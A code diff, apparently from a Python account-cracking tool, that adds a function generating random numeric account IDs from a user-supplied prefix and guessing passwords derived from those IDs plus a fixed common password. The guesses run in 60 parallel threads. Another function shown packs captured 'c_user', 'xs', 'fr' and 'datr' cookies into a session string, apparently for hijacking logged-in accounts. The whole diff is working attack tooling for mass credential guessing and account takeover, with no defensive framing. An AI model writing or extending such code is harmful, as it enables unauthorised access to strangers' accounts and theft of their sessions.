@@ -289,7 +289,7 @@ class Process:
 def m():
     os.system('clear');print(logo)
     print(f'{Y}[{W}1{Y}] {W}METHOD [1]')
-    print(f'{Y}[{W}2{Y}] {W}METHOD [3]')
+    print(f'{Y}[{W}2{Y}] {W}METHOD [2]')
     print(45*"━")
     m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
     if m == '1':
@@ -416,6 +416,24 @@ def cracker(ids,passlist):
         #print(f"\nError: {e}")
         pass
 
+def mainn():
+    os.system('clear')
+    print(logo)
+    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
+    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    for a in range(int(limit)):
+        awm = "".join(random.choice(string.digits) for _ in range(6))
+        gen.append(awm)
+    with ThreadPoolExecutor(max_workers=60) as Submits:
+        print(47*"\x1b[1;97m—") 
+        for next in gen:
+            ids = code + next
+            mk = ids[:6]
+            xx = ids[:7]
+            v = ids[:8]
+            b = next[:6]  
+            passlist = [mk,xx,'57273200',v]
+            Submits.submit(crackerr,ids,passlist)
 
 def convert(cookie):
     cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
